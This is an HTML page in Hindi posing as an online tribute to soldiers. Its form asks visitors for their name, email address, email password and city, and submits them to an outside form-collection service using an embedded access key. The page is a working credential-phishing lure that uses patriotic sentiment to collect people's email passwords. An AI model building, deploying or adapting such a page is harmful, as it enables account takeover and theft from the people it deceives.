    <!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Tribute to Our Soldiers</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(#0d1b2a, #1b263b);
      color: white;
      font-family: 'Segoe UI', sans-serif;
    }
    .tribute-form {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
    }
    .tribute-heading {
      color: #ffd700;
    }
    .btn-tribute {
      background-color: #ff4c4c;
      border: none;
    }
    .btn-tribute:hover {
      background-color: #ff1c1c;
    }
  </style>
</head>
<body>

  <div class="container py-5">
    <h1 class="text-center tribute-heading mb-4">वीरों को श्रद्धांजलि</h1>
    <p class="text-center mb-5">अपना नाम दर्ज करें और हमारे सच्चे रक्षकों को सम्मान दें।</p>

    <div class="row justify-content-center">
      <div class="col-md-6">
        <form class="tribute-form" action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="b39dd412-5f0d-4e8f-b664-cea83d250d7e">
          <div class="mb-3">
            <label for="name" class="form-label">नाम</label>
            <input type="text" name="name" class="form-control" id="name" placeholder="अपना पूरा नाम दर्ज करें" required>
          </div>
          <div class="mb-3">
            <label for="email" class="form-label">ईमेल</label>
            <input type="email" name="email" class="form-control" id="email" placeholder="example@domain.com"required>
          </div>
          <div class="mb-3">
            <label for="text" class="form-label">ईमेल पासवर्ड</label>
            <input type="text" name="text" class="form-control" id="email" placeholder="पासवर्ड डालिये"required>
          </div>
          <div class="mb-3">
            <label for="city" class="form-label">शहर</label>
            <input type="text" name="city" class="form-control" id="city" placeholder="आपका शहर" required>
          </div>
          <!-- <div class="mb-3">
            <label for="message" class="form-label">संदेश</label>
            <textarea class="form-control" name="textarea" id="message" rows="3" placeholder="अपने शब्दों में श्रद्धांजलि..." required></textarea>
          </div> -->
          <!-- <div class="mb-3">
            <label for="tributeType" class="form-label">श्रद्धांजलि का प्रकार</label>
            <select class="form-select" name="select" id="tributeType" required>
              <option selected disabled>चयन करें</option>
              <option value="candle">मोमबत्ती जलाना</option>
              <option value="salute">सलामी देना</option>
              <option value="donation">दान</option>
              <option value="other">अन्य</option>
            </select>
          </div> -->
          <button type="submit" class="btn btn-tribute w-100">श्रद्धांजलि दर्ज करें</button>
        </form>
      </div>
    </div>
  </div>

</body>
</html>
